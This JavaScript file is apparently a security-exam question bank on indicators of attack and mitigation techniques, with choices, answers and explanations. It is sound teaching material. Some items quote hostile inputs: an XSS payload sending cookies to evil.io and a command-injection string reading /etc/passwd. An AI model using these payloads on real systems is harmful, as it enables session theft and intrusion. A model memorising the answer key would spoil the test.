// Fresh Question Bank - Domain 2.0 (part B: 2.4-2.5)
window.FRESH_BANK = (window.FRESH_BANK || []).concat([
// ---------- 2.4 Indicators of malicious activity (34) ----------
{o:"2.4",q:"Logs show exactly one failed login for each of 400 different accounts, all using the password 'Spring2027!', spread over two hours and never tripping the lockout policy. Which attack is this?",c:["Brute-force attack against each account","Password spraying with a shared guess","Credential stuffing with breached pairs","Offline dictionary attack on a hash dump"],a:1,e:["Incorrect. Brute force throws many guesses at a single account and would trip the lockout threshold quickly. Here each account saw one attempt with the same password. It fits when one account shows thousands of failures.","Correct. One common password tried once per account, slowly, stays under lockout thresholds while covering many users. That low-and-slow pattern across many accounts is the signature of password spraying.","Incorrect. Credential stuffing replays username and password pairs leaked elsewhere, so each account would see a different password. The identical password on 400 accounts points elsewhere. It fits after a third-party breach.","Incorrect. An offline dictionary attack runs against stolen hashes and leaves no failed-login events in the authentication logs. These failures are online attempts. It fits when an attacker already holds the password database."]},
{o:"2.4",q:"Attackers feed a list of 50,000 email and password pairs leaked from a gaming site into a bank's login page, and several logins succeed. Which attack is this?",c:["Password spraying with common guesses","Credential stuffing with leaked pairs","Rainbow table lookup on stolen hashes","Pass-the-hash with captured NTLM values"],a:1,e:["Incorrect. Spraying tries a few common passwords against many usernames rather than specific leaked pairs tied to each user. It fits when the same weak guess is attempted across a whole user list.","Correct. The attacker replays real pairs from another breach, and the successes come from customers who reuse passwords across sites. MFA and breached-password screening are the main defenses against it.","Incorrect. Rainbow tables reverse password hashes offline and never touch the login page. It fits when an attacker holds unsalted hashes and needs the plaintext behind them.","Incorrect. Pass-the-hash reuses an NTLM hash inside a Windows network to authenticate without cracking it. Here the attacker submits plaintext passwords to a public web portal, so no hash is involved."]},
{o:"2.4",q:"Authentication logs show a successful login for one user from Chicago at 09:00 and another successful login from Singapore at 09:20. The first session was closed at 09:10. Which indicator is MOST specific to this pattern?",c:["Concurrent session usage on one account","Out-of-cycle logging of the user's activity","Impossible travel between two locations","Resource inaccessibility for the account"],a:2,e:["Incorrect. Concurrent sessions require two sessions to be open at once, and the Chicago session ended at 09:10. It fits when overlapping sessions for one account come from different places or devices.","Incorrect. Out-of-cycle logging means activity at times that are unusual for that user, such as logins at 3 a.m. Both logins here fall in business hours, so the clue is geography. It fits off-hours access.","Correct. No traveler can cover that distance in 20 minutes, so the second login likely came from someone else using stolen credentials or a hijacked token, even though the first session had already closed.","Incorrect. Resource inaccessibility means a system or file becomes unavailable, for example from DoS or ransomware. Both logins succeeded, so nothing was unreachable. It fits when users suddenly cannot open shares."]},
{o:"2.4",q:"The HR system shows two sessions open at the same time under one employee's account, from two different workstations in the same office building. The employee is on vacation. Which indicator is MOST relevant?",c:["Impossible travel across distant regions","Concurrent session usage on one account","Account lockout from repeated failures","Blocked content at the web proxy"],a:1,e:["Incorrect. Impossible travel needs two distant locations too close together in time, and both workstations are in the same building. It fits when logins appear in different cities minutes apart.","Correct. Overlapping sessions on one account while its owner is away suggest shared or stolen credentials. No distance is involved, so the overlap itself is the indicator.","Incorrect. Lockout is triggered by repeated failed attempts, and nothing in the stem shows failures. It fits when an attacker is guessing passwords against the account.","Incorrect. Blocked content describes a proxy or filter denying requests and says nothing about duplicate sessions. It fits when users repeatedly hit denied categories or known-malicious URLs."]},
{o:"2.4",q:"A server's audit log has a 3-hour gap overnight, and the logging service was restarted at 02:00 by an account no one recognizes. What should the analyst suspect?",c:["Scheduled log rotation on the server","Clock skew from an NTP misconfiguration","Missing logs from deliberate tampering","Log volume filling the disk quota"],a:2,e:["Incorrect. Rotation is a scheduled job that archives logs without leaving a gap, and it would run under a known service account. It fits when the gap lines up with a documented schedule.","Incorrect. NTP skew shifts timestamps but does not remove hours of events or explain who restarted the service. It fits when events appear out of order between hosts.","Correct. A gap plus an unexpected service restart by an unknown account is a classic sign that an attacker stopped or cleared logging to cover their tracks, and it warrants incident response.","Incorrect. A full disk can stop logging and create a gap, but it would not explain a restart by an unrecognized account. It fits when the gap ends once space is freed and no unknown account appears."]},
{o:"2.4",q:"A web server shows sustained 100% CPU and outbound connections to a mining pool, and a process named xmrig is running under the web service account. What is the MOST likely cause?",c:["Cryptojacking of server resources","Ransomware encrypting the web root","Logic bomb triggered by a date","Spyware exfiltrating browser data"],a:0,e:["Correct. XMRig is a Monero miner, and a mining-pool connection with sustained CPU use means the attacker is spending the server's resources to mine cryptocurrency.","Incorrect. Ransomware also loads the CPU while encrypting, but it ends in renamed files and a ransom note and does not talk to a mining pool. It fits when files become unreadable.","Incorrect. A logic bomb runs a destructive payload when a date or condition is met; it does not run a miner continuously. It fits when damage appears at a specific time or event.","Incorrect. Spyware collects data quietly and usually has modest CPU use. It fits when the symptoms are uploads of credentials or browsing data rather than a connection to a mining pool."]},
{o:"2.4",q:"Users report that their documents were renamed with a .locked extension, and a README on the desktop demands cryptocurrency for a decryption key. Which malware category is defined by this behavior?",c:["Rootkit hiding deep in the kernel","Keylogger capturing credentials","Ransomware encrypting user files","Worm spreading through SMB"],a:2,e:["Incorrect. A rootkit conceals processes and files at a privileged level and does not encrypt documents or demand payment. It fits when malware survives scans by hiding itself.","Incorrect. A keylogger silently records keystrokes to steal credentials. Visible renamed files and a ransom note point elsewhere. It fits when passwords are stolen without any user-visible symptoms.","Correct. Encrypted, renamed files with a payment demand for a key are the defining behavior of ransomware, regardless of how it arrived on the machine.","Incorrect. A worm self-replicates and may carry ransomware, as WannaCry did, but it is defined by how it spreads. The stem describes the payload, not the propagation."]},
{o:"2.4",q:"Malware moves from host to host across the internal network by exploiting an unpatched SMB flaw, and it infects servers that nobody has logged into. Which malware type is this?",c:["Virus attached to executable files","Trojan disguised as legitimate software","Logic bomb waiting for a trigger","Worm propagating without user action"],a:3,e:["Incorrect. A virus needs a host file and usually a user running it to spread, so servers nobody logs into would stay clean. It fits when infection follows someone opening an infected file.","Incorrect. A Trojan relies on tricking a user into running a disguised program and does not spread by itself. It fits when the malware arrived inside a fake installer.","Incorrect. A logic bomb stays dormant until a date or condition fires and does not move between hosts. It fits when damage occurs at a particular time or after a specific event.","Correct. A worm self-propagates across networks by exploiting vulnerabilities, so even servers nobody touched get infected. WannaCry spread this way through SMB."]},
{o:"2.4",q:"A free PDF converter installs and works as advertised, but it also opens a persistent remote-access channel to an external server. What is the BEST classification?",c:["Adware that displays unwanted ads","Worm that replicates to other hosts","Trojan delivering a remote backdoor","Ransomware that encrypts local files"],a:2,e:["Incorrect. Adware shows or injects ads to earn revenue and does not open a remote-control channel. It fits when the symptom is pop-ups and a hijacked homepage.","Incorrect. A worm spreads on its own without user action. The user installed this converter and no spreading is described. It fits when other hosts become infected automatically.","Correct. The program has a legitimate-looking function that hides a malicious one, and the backdoor to an outside server makes it a remote access Trojan (RAT).","Incorrect. Ransomware encrypts files and demands payment, and nothing here is encrypted. It fits when the user sees a ransom note instead of a quiet outbound connection."]},
{o:"2.4",q:"After a developer resigned, the payroll server deletes its database whenever his employee record cannot be found in the HR table. The code was written by him. What is this?",c:["Trojan hidden in a utility","Rootkit concealing the script","Worm spreading to other servers","Logic bomb tied to a condition"],a:3,e:["Incorrect. A Trojan masquerades as useful software to get installed. This code was planted by an insider and is defined by its trigger, not a disguise. It fits when users are tricked into running it.","Incorrect. A rootkit conceals its presence at a privileged level but carries no trigger-based payload by itself. It fits when the question is about hiding, not detonating.","Incorrect. A worm replicates to other hosts, and nothing in the stem spreads. It fits when the same code shows up on many servers on its own.","Correct. Malicious code that stays dormant until a specific condition is met, here the removal of his record, is a logic bomb, and insiders are the usual authors."]},
{o:"2.4",q:"An EDR alert shows winword.exe spawning PowerShell with an encoded command that makes WMI calls, yet no new executable was written to disk and antivirus found nothing. What is MOST likely?",c:["Boot-sector virus on the local disk","Hardware keylogger on a USB port","Adware bundled with a freeware app","Fileless malware running in memory"],a:3,e:["Incorrect. A boot-sector virus lives in the disk's boot area, so it would be written to disk and typically flagged. Nothing was written here. It fits when infection survives OS reinstalls.","Incorrect. A hardware keylogger is a physical device and would not generate PowerShell or WMI activity. It fits when inspection of the keyboard cable reveals an inline device.","Incorrect. Adware arrives as an installed program that shows ads and would leave files on disk. It fits when users report pop-ups after installing freeware.","Correct. Office spawning PowerShell with encoded commands and WMI while leaving no file artifacts is living-off-the-land fileless malware that runs in memory using built-in tools."]},
{o:"2.4",q:"The OS process list and file listing show nothing unusual, but a memory dump taken from outside the OS reveals a hidden driver intercepting system calls. Which malware type is defined by this concealment?",c:["Spyware collecting browsing data","Bloatware preinstalled by the vendor","Rootkit hooking kernel system calls","Trojan disguised as a driver"],a:2,e:["Incorrect. Spyware is defined by collecting information, not by concealing itself from the OS, although a rootkit can hide it. It fits when the concern is data collection.","Incorrect. Bloatware is unwanted vendor software that is visible and removable in the installed-programs list. It fits when a new laptop ships with trial apps.","Correct. Hooking system calls at kernel level to hide processes and files from the OS and antivirus is what a rootkit does, which is why out-of-band analysis was needed to see it.","Incorrect. A Trojan is defined by disguising itself as legitimate software to get installed, not by hiding from the OS afterward. It fits when the user was tricked into running it."]},
{o:"2.4",q:"During a physical inspection, a technician finds a small inline device between a keyboard cable and the USB port of an accounting PC. Software scans of the PC are clean. What is it MOST likely?",c:["Kernel rootkit hiding processes","Card skimmer on a payment reader","Rogue USB drive with a payload","Hardware keylogger on the cable"],a:3,e:["Incorrect. A rootkit is software and would appear in a memory or offline scan rather than as a physical device. It fits when the finding is a hidden driver.","Incorrect. Skimmers capture card data at readers such as ATMs and gas pumps, not between a keyboard and a PC. It fits when the device sits over a card slot.","Incorrect. A malicious USB drive is a drop device that is plugged in and executes a payload, usually appearing as a drive or HID. It fits when an unknown flash drive is found in the parking lot.","Correct. An inline device between keyboard and PC records every keystroke without installing software, which is why clean scans are expected. Physical inspection is the detection method."]},
{o:"2.4",q:"Tens of thousands of compromised IoT cameras send traffic at the same time to one DNS provider, and major websites that rely on it become unreachable. What is this?",c:["On-path attack intercepting DNS replies","DNS cache poisoning of resolvers","Reflected cross-site scripting attack","Botnet-driven distributed DoS attack"],a:3,e:["Incorrect. An on-path attack intercepts or alters traffic between two parties, and nothing is being intercepted. It fits when an attacker sits between client and resolver.","Incorrect. Cache poisoning inserts forged records so users are redirected, but the provider's answers here are simply unavailable. It fits when users reach the wrong site.","Incorrect. Reflected XSS bounces a script off a web app into a victim's browser. It is not a traffic flood. It fits when a crafted link runs script in a user's session.","Correct. Many compromised devices flooding one target with traffic is a distributed denial of service, and Mirai against Dyn is the classic example."]},
{o:"2.4",q:"An attacker sends 60-byte DNS queries with the victim's spoofed source IP to open resolvers, which return 3,000-byte responses to the victim. What attack is this?",c:["Amplified reflection DDoS attack","TCP SYN flood against the victim","Smurf attack with ICMP broadcasts","Slowloris against the web server"],a:0,e:["Correct. The spoofed source makes it reflected, and tiny requests producing large responses make it amplified. Open DNS resolvers and NTP servers are common amplifiers.","Incorrect. A SYN flood sends SYNs directly to exhaust the target's half-open connection table. There are no third-party replies and no size multiplication. It fits when connection tables fill.","Incorrect. Smurf sends spoofed ICMP echo requests to a broadcast address so hosts reply to the victim. It is amplified and reflected but uses ICMP, not DNS. It fits when ping replies flood the victim.","Incorrect. Slowloris holds many partial HTTP connections open to exhaust a web server and uses very little bandwidth. It fits when a server runs out of connection slots while traffic stays low."]},
{o:"2.4",q:"A company is flooded with SYN-ACK packets from hundreds of legitimate third-party web servers replying to SYNs forged with the company's IP address. Each reply is about the same size as the forged request. Which description is MOST accurate?",c:["Amplified DDoS using open resolvers","On-path interception of sessions","Reflected DDoS, no amplification","Replay of captured handshakes"],a:2,e:["Incorrect. Amplification requires responses much larger than the requests, as with DNS or NTP, and the stem says the sizes match. It fits when a small query triggers a large reply.","Incorrect. On-path means the attacker sits in the traffic path and reads or alters it. Nothing is intercepted here; servers are answering forged packets. It fits when a rogue gateway relays sessions.","Correct. Third parties are tricked into sending replies to a spoofed victim, which is reflection. Because the replies are not larger than the requests, there is no amplification.","Incorrect. Replay resends previously captured valid data to repeat an action or authenticate. These are freshly forged SYNs, not captured handshakes. It fits when old tokens or messages are reused."]},
{o:"2.4",q:"On a guest Wi-Fi network, the victim's ARP cache maps the gateway's IP address to the MAC address of another laptop, and the victim's traffic flows through that laptop. What BEST describes this?",c:["DNS amplification against the gateway","On-path attack via ARP poisoning","MAC flooding of the access switch","Evil twin rogue access point"],a:1,e:["Incorrect. Amplification is a DDoS technique that multiplies traffic and does not change ARP caches. It fits when a victim is flooded by large unsolicited responses.","Correct. Forged ARP replies map the gateway's IP to the attacker's MAC, placing the attacker between victim and gateway where traffic can be read or modified.","Incorrect. MAC flooding overflows a switch's CAM table so it floods frames like a hub, and the victim's ARP cache is not altered. It fits when a switch starts broadcasting all traffic.","Incorrect. An evil twin imitates a legitimate SSID to lure clients onto a rogue AP. Here the association is normal and the problem is the wrong ARP mapping. It fits when users join a lookalike network."]},
{o:"2.4",q:"An attacker modifies the handshake so a client and server agree on SSL 3.0, even though both support TLS 1.2. Which attack is this?",c:["Replay of a captured handshake","Protocol downgrade attack","Birthday attack on the hash","Pass-the-hash with NTLM values"],a:1,e:["Incorrect. Replay resends captured valid messages, while this attacker modifies the negotiation itself. It fits when old authentication data is reused later.","Correct. Forcing both sides onto a weaker version than they support is a downgrade attack, and POODLE exploited SSL 3.0 this way. Disabling legacy versions removes the option.","Incorrect. A birthday attack searches for hash collisions and has nothing to do with protocol version negotiation. It fits when two different inputs produce the same digest.","Incorrect. Pass-the-hash reuses a captured NTLM hash to authenticate in a Windows environment and involves no TLS handshake. It fits when a hash from memory is used to reach file servers."]},
{o:"2.4",q:"An attacker captures a valid session token on public Wi-Fi and submits the identical token to the server two hours later, gaining access without knowing the password. What is this?",c:["Replay of a stolen session token","Protocol downgrade of the session","Hash collision against the token","Brute-force guessing of the token"],a:0,e:["Correct. Resubmitting previously captured valid data unchanged is a replay. Short session lifetimes, nonces, timestamps and TLS all help defend against it.","Incorrect. A downgrade changes the negotiated protocol version, and nothing is renegotiated here. It fits when a weaker cipher or SSL version is forced during the handshake.","Incorrect. A collision means two inputs share a hash value, which is irrelevant to reusing an unchanged token. It fits when a forged document matches a signed digest.","Incorrect. Brute force guesses values by trial, and this attacker already holds a valid token and guesses nothing. It fits when tokens are short or predictable and are tried repeatedly."]},
{o:"2.4",q:"A network authentication protocol issues time-stamped tickets from a central KDC, provides mutual authentication, and makes captured authentication data useless after a few minutes. Which protocol matches?",c:["NTLM challenge-response auth","Kerberos with timed tickets","PAP cleartext over PPP links","OAuth 2.0 bearer token flow"],a:1,e:["Incorrect. NTLM uses challenge-response without a KDC or mutual authentication and is vulnerable to relay and pass-the-hash. It fits for legacy systems outside a Kerberos domain.","Correct. Kerberos uses a KDC, tickets with timestamps that resist replay, and mutual authentication between the client and the service.","Incorrect. PAP sends credentials in cleartext with no tickets or mutual authentication. It fits only in old PPP dial-up scenarios.","Incorrect. OAuth 2.0 delegates authorization to APIs using tokens and has no KDC. It does not provide mutual user authentication. It fits when an app needs limited access to a user's data."]},
{o:"2.4",q:"A vendor signs a contract's MD5 hash. An attacker earlier crafted a second, different contract with the identical MD5 hash and substitutes it after signing. Which attack is this?",c:["Rainbow table hash reversal","Replay of the signed document","Protocol downgrade attack","MD5 hash collision attack"],a:3,e:["Incorrect. Rainbow tables reverse password hashes to plaintext, and nothing is being recovered here. It fits when unsalted password hashes are stolen.","Incorrect. Replay resends an unchanged captured message, but this attacker substitutes a different document. It fits when the original signed message is submitted again.","Incorrect. A downgrade forces weaker protocol versions during negotiation, and no negotiation happens here. It fits when a client is pushed from TLS 1.2 to an older version.","Correct. Two different inputs with the same hash defeat integrity. Birthday attacks find collisions far faster than expected, and MD5 is broken, so SHA-256 or stronger should be used."]},
{o:"2.4",q:"An attacker extracts an NTLM hash from a workstation's memory and uses it directly to authenticate to file servers, never recovering the plaintext password. Which attack is this?",c:["Password spraying across servers","Pass-the-hash credential reuse","Credential stuffing from a leak","Offline hash cracking with GPUs"],a:1,e:["Incorrect. Spraying guesses a common password against many accounts, while this attacker already holds a valid hash. It fits when one weak password is tried across a user list.","Correct. The hash itself is used as the credential, so no cracking is needed. Credential Guard, least privilege and disabling NTLM mitigate it.","Incorrect. Credential stuffing replays plaintext pairs leaked from another site, and no leaked plaintext is used here. It fits after a third-party breach.","Incorrect. GPU cracking recovers the plaintext from hashes, and the stem says that never happened. It fits when the goal is to learn the actual password."]},
{o:"2.4",q:"A secure web gateway log shows a workstation repeatedly requesting a URL in a category the policy denies, and each request returns a block page. Which indicator type is this?",c:["Impossible travel between logins","Blocked content in proxy logs","Resource consumption on the host","Out-of-cycle logging of activity"],a:1,e:["Incorrect. Impossible travel compares login locations over time, and no authentication or location data appears here. It fits when one account logs in from distant places minutes apart.","Correct. Repeated denied requests in proxy logs are blocked-content events. They can show policy violations or malware beaconing to a banned category.","Incorrect. Resource consumption refers to abnormal CPU, memory, bandwidth or disk use, and the log shows denied requests rather than load. It fits when a host is pegged at 100% CPU.","Incorrect. Out-of-cycle logging concerns activity at odd times for a user or system, and the stem gives no timing anomaly. It fits when an account is active at 3 a.m."]},
{o:"2.4",q:"A firewall log shows one external IP attempting connections to ports 23, 445 and 3389 on many internal hosts over several minutes. The firewall dropped every attempt. What is the BEST description?",c:["Initial access through exposed RDP","Volumetric DDoS against the perimeter","Out-of-cycle logging by the firewall","Reconnaissance scan of blocked ports"],a:3,e:["Incorrect. Initial access requires a connection to succeed, and every attempt was dropped. It fits when allowed RDP logons from the same IP appear in the logs.","Incorrect. A DDoS depends on overwhelming volume, usually from many sources, while this is a modest number of attempts from one IP. It fits when bandwidth or connection tables are exhausted.","Incorrect. Out-of-cycle logging means unusual timing of activity, and the stem gives no timing anomaly, only the destination ports. It fits when events occur at odd hours.","Correct. Probing common management and file-sharing ports across many hosts is port scanning. Because every attempt was dropped, it is a reconnaissance indicator rather than a compromise."]},
{o:"2.4",q:"After a tester types a single quote into a login form, the application returns a page showing a database syntax error and the names of two tables. What does this indicate?",c:["SQL injection weakness being probed","Cross-site scripting reflected in output","Directory traversal outside the web root","Buffer overflow crashing the process"],a:0,e:["Correct. A quote that breaks the query and leaks a database error is the classic SQL injection probe, and verbose errors expose schema details that help the attacker.","Incorrect. XSS would show script content executing or being echoed in the page, not a database syntax error. It fits when injected markup runs in the browser.","Incorrect. Directory traversal uses ../ sequences to read files outside the web root, and no file paths are manipulated here. It fits when a parameter such as file=../../etc/passwd returns content.","Incorrect. A buffer overflow overwrites memory with oversized input and typically crashes the process, while this application returned a SQL error and kept running. It fits when long input causes a crash."]},
{o:"2.4",q:"An attacker with a standard-user shell on a Linux server abuses a sudo rule that permits editing files with vi, escapes to a shell and becomes root. Which stage is this?",c:["Initial access to the server","Lateral movement to a new host","Exfiltration of collected data","Vertical privilege escalation"],a:3,e:["Incorrect. The attacker already has a shell, so initial access happened earlier. It fits when the question is how they first got in, such as phishing or an exposed service.","Incorrect. Lateral movement is pivoting to other hosts, and the attacker stays on this one. It fits when credentials are used to reach other servers.","Incorrect. No data has been copied out. Exfiltration fits when sensitive files are transferred to an external system.","Correct. Going from a limited account to root on the same system is vertical privilege escalation, here through a sudo misconfiguration."]},
{o:"2.4",q:"Using credentials from a compromised workstation, an attacker opens RDP sessions to a file server and then to a domain controller. Which stage is this?",c:["Vertical privilege escalation","Initial access by phishing","Persistence through scheduled tasks","Lateral movement across hosts"],a:3,e:["Incorrect. Vertical escalation raises rights on one system, while this attacker uses existing credentials to reach different systems. It fits when a standard user becomes root or SYSTEM on one host.","Incorrect. Initial access is the first foothold, and that was the compromised workstation. It fits when the question is how the attacker entered the environment.","Incorrect. Persistence keeps access across reboots or password changes, and no such mechanism is described. It fits when a scheduled task or run key is created to relaunch the implant.","Correct. Pivoting from host to host inside the network with harvested credentials is lateral movement."]},
{o:"2.4",q:"A user reports pop-up ads on the desktop even with the browser closed, and the browser homepage keeps resetting to a search site after being changed. What is MOST likely installed?",c:["Adware or potentially unwanted app","Rootkit hiding kernel drivers","Logic bomb in a startup script","Worm spreading over SMB shares"],a:0,e:["Correct. Persistent ads and a hijacked homepage are the hallmark of adware or a PUP, which is often bundled with freeware.","Incorrect. Rootkits hide themselves and do not advertise. It fits when security tools disagree about which processes are running.","Incorrect. A logic bomb fires on a trigger and typically destroys or alters data, and it produces no ads. It fits when damage appears on a particular date or event.","Incorrect. A worm spreads itself across the network, and the symptoms would be scanning or network traffic rather than ads. It fits when many hosts are infected without user action."]},
{o:"2.4",q:"A new laptop arrives with a dozen trial programs and vendor utilities that the user never requested. What is this software called, and why does it matter for security?",c:["Bloatware, because it expands attack surface","Ransomware, because it encrypts user files","Rootkit, because it conceals running processes","Spyware, because it records user activity"],a:0,e:["Correct. Unnecessary preinstalled software adds attack surface and patching burden, so it should be removed as part of hardening the build.","Incorrect. Ransomware demands payment after encrypting data, and nothing here is encrypted. It fits when files are renamed and a ransom note appears.","Incorrect. Rootkits conceal themselves, while these apps are plainly visible in the installed-programs list. It fits when a driver is hidden from OS tools.","Incorrect. Spyware covertly records activity, and trial applications are not defined by that, although some bloatware does send telemetry. It fits when a hidden agent captures keystrokes or browsing."]},
{o:"2.4",q:"A web server log shows this request parameter: q=<script>fetch('//evil.io?c='+document.cookie)</script>. Which attack is being attempted?",c:["Cross-site scripting cookie theft","SQL injection against the database","Command injection on the web server","LDAP injection into the directory"],a:0,e:["Correct. A script tag that sends document.cookie to an external host is XSS aimed at stealing session cookies.","Incorrect. SQL injection uses quotes and SQL keywords such as UNION or OR 1=1, and none appear here. It fits when a parameter contains query syntax.","Incorrect. Command injection uses shell separators such as ; | or && to run OS commands, and none appear here. It fits when a parameter like host=8.8.8.8;id is sent.","Incorrect. LDAP injection manipulates directory filters with characters such as )( and *, and none appear here. It fits when a login form builds an LDAP search from user input."]},
{o:"2.4",q:"A request to a diagnostics page contains host=8.8.8.8;cat /etc/passwd, and the response includes the contents of the password file. Which attack is this?",c:["OS command injection through the page","Directory traversal with dot-dot paths","Cross-site request forgery of an admin","SQL injection through the host field"],a:0,e:["Correct. The semicolon ends the ping argument and chains a second shell command, so the application is executing OS commands built from attacker input.","Incorrect. Traversal reads files using ../ sequences in a path parameter, and no path is manipulated here because a chained command prints the file. It fits when file=../../etc/passwd returns content.","Incorrect. CSRF tricks a logged-in user's browser into sending an unwanted request and does not supply shell syntax directly. It fits when a hidden form changes a setting using the victim's session.","Incorrect. SQL injection alters database queries with SQL syntax, and none appears here. It fits when quotes or UNION statements change query results."]},
{o:"2.4",q:"On Monday at 08:05, 60 user accounts were locked out within ten minutes, and every failed attempt came from a single external IP address. What is the MOST likely activity?",c:["Volumetric DDoS against the portal","Data exfiltration by an insider","Forgotten passwords after the weekend","Password attack triggering lockouts"],a:3,e:["Incorrect. A DDoS aims to exhaust capacity with volume, usually from many sources, and would not produce per-account failed logins. It fits when the portal becomes slow or unreachable.","Incorrect. Exfiltration is outbound data movement and does not produce failed logins. It fits when large uploads leave to an unknown destination.","Incorrect. Weekend forgetfulness would be scattered across many internal addresses, while one external IP is the clue. It fits when failures come from users' own devices over different days.","Correct. Many failures against many accounts from one source is a brute-force or spraying attempt that tripped the lockout policy."]},
{o:"2.4",q:"An NGFW logs one workstation sending a DNS query every 60 seconds to a different random-looking subdomain of the same newly registered domain. What does this MOST likely indicate?",c:["Routine operating system update checks","Malware C2 beaconing or DNS tunneling","A misconfigured network printer","A phishing email being delivered"],a:1,e:["Incorrect. OS update checks use stable, well-known vendor domains rather than random subdomains of a new domain. It fits when queries go to the vendor's published update hosts.","Correct. Fixed intervals combined with random subdomains of a new domain is typical of malware beaconing to command-and-control or data smuggled out through DNS tunneling.","Incorrect. A misconfigured printer repeats queries for the same few names and does not generate random subdomains. It fits when the same name is queried constantly.","Incorrect. Phishing is delivered over email protocols and does not appear as periodic DNS queries from a workstation. It fits when a message with a malicious link arrives at the mail gateway."]},
{o:"2.4",q:"A technician discovers a thin overlay on a gas pump's card reader and a tiny wireless transmitter inside the pump. Which category of attack is this?",c:["On-path attack on the payment network","Watering hole attack on a fuel website","Physical attack using a card skimmer","Replay of captured payment tokens"],a:2,e:["Incorrect. On-path attacks intercept network traffic between endpoints, while here the data is captured at the reader before it reaches any network. It fits when a rogue device sits in the payment path.","Incorrect. A watering hole compromises a website that the target group frequently visits, and nothing here is web-based. It fits when a trade site serves malware to its regular visitors.","Correct. An overlay with a hidden transmitter captures card data physically at the reader, and the stolen data can then be used to clone cards.","Incorrect. Replay resends captured valid tokens, and the device here is the capture mechanism rather than the reuse. It fits when previously captured transaction data is submitted again."]},

// ---------- 2.5 Mitigation techniques (24) ----------
{o:"2.5",q:"After a breach, Redwood Clinic wants infusion pumps and imaging devices, which must stay in service, to reach only the EHR server so one compromised device cannot spread through the hospital. Which mitigation fits?",c:["Segmentation using a dedicated VLAN","Full-disk encryption on every device","Continuous monitoring with a SIEM","Decommissioning of the legacy devices"],a:0,e:["Correct. Placing the devices in their own VLAN with firewall rules limits what can reach them and how far an attacker can move laterally.","Incorrect. Full-disk encryption protects stored data if a device is stolen and does not restrict network movement. Many medical devices cannot run it anyway. It fits when physical theft is the concern.","Incorrect. Monitoring detects spread but does not prevent it. It fits when the goal is visibility and alerting rather than restricting reachability.","Incorrect. Decommissioning removes devices from service, and the stem says they must remain in use. It fits when equipment reaches end of life and can be retired."]},
{o:"2.5",q:"A public web server must accept only HTTPS from the internet and SSH from the 10.5.0.0/24 admin subnet, dropping everything else. Which mitigation directly enforces this?",c:["Configuration enforcement with Group Policy","Isolation of the server from the network","Access control list on the edge firewall","Patching of the web server software"],a:2,e:["Incorrect. Configuration enforcement keeps host settings at a baseline and does not define which network sources may connect. It fits when local admins keep weakening security settings.","Incorrect. Isolation cuts off all connectivity, which would take the public site down. It fits as an emergency response to a compromised host.","Correct. ACL entries permit specific sources, ports and protocols and end with an implicit deny, which is exactly the policy described.","Incorrect. Patching removes software flaws but does not restrict who can connect. It fits when a vendor fix exists for a known vulnerability."]},
{o:"2.5",q:"Lobby kiosks should run only the one approved check-in application, and any other executable, including never-before-seen malware, must be prevented from launching. Which control fits?",c:["Application allow list policy","Application deny list policy","Sandboxed application execution","Least-privilege kiosk accounts"],a:0,e:["Correct. An allow list permits only approved applications and blocks everything else by default, including unknown malware. It suits fixed-purpose systems.","Incorrect. A deny list blocks only known-bad items and lets everything else run, so brand-new malware would launch. It fits when you need a quick block of specific known threats.","Incorrect. A sandbox contains an application but still lets it run, and the stem requires that other executables not launch at all. It fits when you want to observe untrusted code safely.","Incorrect. Least privilege limits what the user can change, but a standard user can still run downloaded programs. It fits when the concern is excess rights rather than which code executes."]},
{o:"2.5",q:"An EDR agent detects ransomware encrypting files on a laptop and immediately cuts its network access except for a channel to the EDR console so analysts can investigate. Which mitigation is this?",c:["Host isolation through quarantine","Permanent network segmentation","Decommissioning of the laptop","Configuration enforcement by policy"],a:0,e:["Correct. Isolation temporarily removes the compromised host from the network to contain spread while still allowing forensic access through the console.","Incorrect. Segmentation is permanent network design applied before incidents, not an automatic response to a detection. It fits when systems of different trust levels need separate zones.","Incorrect. Decommissioning retires and sanitizes an asset, while this laptop will be investigated and reimaged. It fits when hardware reaches end of life.","Incorrect. Configuration enforcement restores baseline settings and does not stop active encryption. It fits when settings drift from the approved baseline."]},
{o:"2.5",q:"A company retires aging file servers by wiping and shredding the drives, removing the hosts from DNS, monitoring and inventory, and closing their firewall rules. Which mitigation is this?",c:["Isolation of compromised hosts","Configuration enforcement of GPO baselines","Application allow listing on servers","Decommissioning of retired assets"],a:3,e:["Incorrect. Isolation keeps a host but cuts its network access, while here the hosts are destroyed. It fits when a live system is compromised and must be contained.","Incorrect. Configuration enforcement keeps in-use systems at the approved baseline, and these servers are leaving service. It fits when active systems drift from policy.","Incorrect. Allow listing controls which programs may execute on a running system and does not retire anything. It fits when servers should run only approved software.","Correct. Properly decommissioning assets removes both data and records, so forgotten zombie servers cannot later be found and exploited."]},
{o:"2.5",q:"Group Policy reapplies the approved security baseline to every workstation every 90 minutes, reverting any setting a local administrator changed. Which mitigation is this?",c:["Application allow listing policy","Configuration enforcement (GPO)","Network segmentation by VLAN","Full-disk encryption at rest"],a:1,e:["Incorrect. Allow listing controls which applications may run and does not revert changed settings. It fits when unapproved software must be blocked from executing.","Correct. Configuration enforcement keeps systems at the approved baseline and automatically corrects drift, which is what the recurring GPO refresh does.","Incorrect. Segmentation separates networks and says nothing about workstation settings. It fits when you need to limit lateral movement between zones.","Incorrect. Full-disk encryption protects data on a lost device and does not restore settings. It fits when theft of laptops is the concern."]},
{o:"2.5",q:"A vendor has released a fix for a publicly disclosed remote-code-execution flaw in a web server's code. Which action removes the underlying flaw rather than working around it?",c:["Deploy a WAF virtual patching rule","Restrict the server with a new ACL","Disable the vulnerable feature in config","Apply the vendor patch after testing"],a:3,e:["Incorrect. A WAF virtual patch blocks known exploit patterns while the flaw remains in the code. It fits when no patch exists yet or it cannot be applied soon.","Incorrect. An ACL narrows who can reach the service but leaves the vulnerable code in place for anyone still allowed. It fits as a compensating control for systems that cannot be patched.","Incorrect. Disabling a feature reduces attack surface but the flawed code remains installed. It fits when a feature is unused and the patch is delayed.","Correct. Installing the vendor patch replaces the vulnerable code, so the flaw is gone rather than masked. Testing first avoids breaking production."]},
